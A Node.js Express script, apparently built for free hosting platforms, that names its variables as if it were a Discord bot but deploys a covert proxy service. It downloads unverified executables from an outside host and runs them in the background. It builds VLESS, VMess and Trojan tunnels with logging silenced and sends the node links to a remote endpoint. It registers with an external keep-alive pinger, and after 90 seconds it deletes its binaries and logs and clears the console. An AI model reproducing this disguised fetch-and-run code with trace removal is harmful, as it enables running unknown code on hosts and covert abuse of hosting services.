const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');        // 
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';      // 
const BOT_PUBLIC_URL = process.env.BOT_PUBLIC_URL || '';    // 
const ENABLE_AUTO_PING = process.env.ENABLE_AUTO_PING || false; // 
const BOT_DATA_PATH = process.env.BOT_DATA_PATH || './tmp';   // 
const SUBSCRIPTION_PATH = process.env.SUBSCRIPTION_PATH || 'sub';       // 
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        // 
const BOT_TOKEN = process.env.BOT_TOKEN || '5098e6df-ef66-488d-836d-9f49ae40c544'; // 
const APP_DOMAIN = process.env.APP_DOMAIN || '';          // 
const APP_TOKEN = process.env.APP_TOKEN || '';              // 
const APP_PORT = process.env.APP_PORT || 8001;            // 
const CDN_IP = process.env.CDN_IP || 'cf.877774.xyz';         //   
const CDN_PORT = process.env.CDN_PORT || 443;                   // 
const BOT_NAME = process.env.BOT_NAME || 'Vls';                     // 

//创建运行文件夹
if (!fs.existsSync(BOT_DATA_PATH)) {
  fs.mkdirSync(BOT_DATA_PATH);
  console.log(`${BOT_DATA_PATH} is created`);
} else {
  console.log(`${BOT_DATA_PATH} already exists`);
}

let corePath = path.join(BOT_DATA_PATH, 'core');
let connectorPath = path.join(BOT_DATA_PATH, 'connector');
let subscriptionFilePath = path.join(BOT_DATA_PATH, 'sub.txt');
let nodeListPath = path.join(BOT_DATA_PATH, 'list.txt');
let connectorLogPath = path.join(BOT_DATA_PATH, 'boot.log');
let coreConfigPath = path.join(BOT_DATA_PATH, 'config.json');

// 如果订阅器上存在历史运行节点则先删除
function deleteNodes() {
  try {
    if (!DISCORD_WEBHOOK_URL) return;
    if (!fs.existsSync(subscriptionFilePath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subscriptionFilePath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    return axios.post(`${DISCORD_WEBHOOK_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch((error) => { 
      return null; 
    });
  } catch (err) {
    return null;
  }
}

//清理历史文件
function cleanupOldFiles() {
  const pathsToDelete = ['core', 'connector', 'sub.txt', 'boot.log'];
  pathsToDelete.forEach(file => {
    const filePath = path.join(BOT_DATA_PATH, file);
    fs.unlink(filePath, () => {});
  });
}

// 根路由
app.get("/", function(req, res) {
  res.send("Hello world!");
});

// 生成xr-ay配置文件
const config = {
  log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
  inbounds: [
    { port: APP_PORT, protocol: 'vless', settings: { clients: [{ id: BOT_TOKEN, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
    { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: BOT_TOKEN }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
    { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: BOT_TOKEN, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: BOT_TOKEN, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: BOT_TOKEN }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
  ],
  dns: { servers: ["https+local://8.8.8.8/dns-query"] },
  outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
};
fs.writeFileSync(path.join(BOT_DATA_PATH, 'config.json'), JSON.stringify(config, null, 2));

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = path.join(BOT_DATA_PATH, fileName);
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${fileName} successfully`);
        callback(null, fileName);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${fileName} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${fileName} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
        if (err) {
          reject(err);
        } else {
          resolve(fileName);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(relativeFilePath => {
      const absoluteFilePath = path.join(BOT_DATA_PATH, relativeFilePath);
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = ['./core', './connector'];
  authorizeFiles(filesToAuthorize);

  //运行xr-ay
  const command1 = `nohup ${BOT_DATA_PATH}/core -c ${BOT_DATA_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log('core is running');
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`core running error: ${error}`);
  }

  // 运行cloud-fared
  if (fs.existsSync(path.join(BOT_DATA_PATH, 'connector'))) {
    let args;

    if (APP_TOKEN.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${APP_TOKEN}`;
    } else if (APP_TOKEN.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${BOT_DATA_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${BOT_DATA_PATH}/boot.log --loglevel info --url http://localhost:${APP_PORT}`;
    }

    try {
      await exec(`nohup ${BOT_DATA_PATH}/connector ${args} >/dev/null 2>&1 &`);
      console.log('connector is running');
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  if (architecture === 'arm') {
    return [
      { fileName: "core", fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: "connector", fileUrl: "https://arm64.ssss.nyc.mn/2go" }
    ];
  } else {
    return [
      { fileName: "core", fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: "connector", fileUrl: "https://amd64.ssss.nyc.mn/2go" }
    ];
  }
}

// 获取固定隧道json
function argoType() {
  if (!APP_TOKEN || !APP_DOMAIN) {
    console.log("APP_DOMAIN or APP_TOKEN variable is empty, use quick tunnels");
    return;
  }

  if (APP_TOKEN.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(BOT_DATA_PATH, 'tunnel.json'), APP_TOKEN);
    const tunnelYaml = `
  tunnel: ${APP_TOKEN.split('"')[11]}
  credentials-file: ${path.join(BOT_DATA_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${APP_DOMAIN}
      service: http://localhost:${APP_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(BOT_DATA_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("APP_TOKEN mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (APP_TOKEN && APP_DOMAIN) {
    argoDomain = APP_DOMAIN;
    console.log('APP_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(BOT_DATA_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running connector to obtain ArgoDomain');
        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
        fs.unlinkSync(path.join(BOT_DATA_PATH, 'boot.log'));
        async function killConnectorProcess() {
          try {
            await exec('pkill -f "[c]onnector" > /dev/null 2>&1');
          } catch (error) {
            // 忽略输出
          }
        }
        killConnectorProcess();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${BOT_DATA_PATH}/boot.log --loglevel info --url http://localhost:${APP_PORT}`;
        try {
          await exec(`nohup ${path.join(BOT_DATA_PATH, 'connector')} ${args} >/dev/null 2>&1 &`);
          console.log('connector is running.');
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains(); // 重新提取域名
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }

  // 生成 list 和 sub 信息
  async function generateLinks(argoDomain) {
    const metaInfo = execSync(
      'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();

    return new Promise((resolve) => {
      setTimeout(() => {
        const VMESS = { v: '2', ps: `${BOT_NAME}-${ISP}`, add: CDN_IP, port: CDN_PORT, id: BOT_TOKEN, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '' };
        const subTxt = `
vless://${BOT_TOKEN}@${CDN_IP}:${CDN_PORT}?encryption=none&security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${BOT_NAME}-${ISP}
  
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
  
trojan://${BOT_TOKEN}@${CDN_IP}:${CDN_PORT}?security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${BOT_NAME}-${ISP}
    `;
        // 打印 sub.txt 内容到控制台
        console.log(Buffer.from(subTxt).toString('base64'));
        fs.writeFileSync(subscriptionFilePath, Buffer.from(subTxt).toString('base64'));
        console.log(`${BOT_DATA_PATH}/sub.txt saved successfully`);
        uplodNodes();
        // 将内容进行 base64 编码并写入 SUBSCRIPTION_PATH 路由
        app.get(`/${SUBSCRIPTION_PATH}`, (req, res) => {
          const encodedContent = Buffer.from(subTxt).toString('base64');
          res.set('Content-Type', 'text/plain; charset=utf-8');
          res.send(encodedContent);
        });
        resolve(subTxt);
      }, 2000);
    });
  }
}

// 自动上传节点或订阅
async function uplodNodes() {
  if (DISCORD_WEBHOOK_URL && BOT_PUBLIC_URL) {
    const subscriptionUrl = `${BOT_PUBLIC_URL}/${SUBSCRIPTION_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${DISCORD_WEBHOOK_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response.status === 200) {
            console.log('Subscription uploaded successfully');
        } else {
          return null;
          //  console.log('Unknown response status');
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (DISCORD_WEBHOOK_URL) {
      if (!fs.existsSync(nodeListPath)) return;
      const content = fs.readFileSync(nodeListPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          await axios.post(`${DISCORD_WEBHOOK_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response.status === 200) {
            console.log('Subscription uploaded successfully');
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [connectorLogPath, coreConfigPath, corePath, connectorPath];  
    
    exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
      console.clear();
      console.log('App is running');
      console.log('Thank you for using this script, enjoy!');
    });
  }, 90000); // 90s
}
cleanFiles();

// 自动访问项目URL
async function AddVisitTask() {
  if (!ENABLE_AUTO_PING || !BOT_PUBLIC_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: BOT_PUBLIC_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log(`automatic access task added successfully`);
  } catch (error) {
    console.error(`添加URL失败: ${error.message}`);
  }
}

// 回调运行
async function startserver() {
  deleteNodes();
  cleanupOldFiles();
  await downloadFilesAndRun();
  await extractDomains();
  AddVisitTask();
}
startserver();

app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));
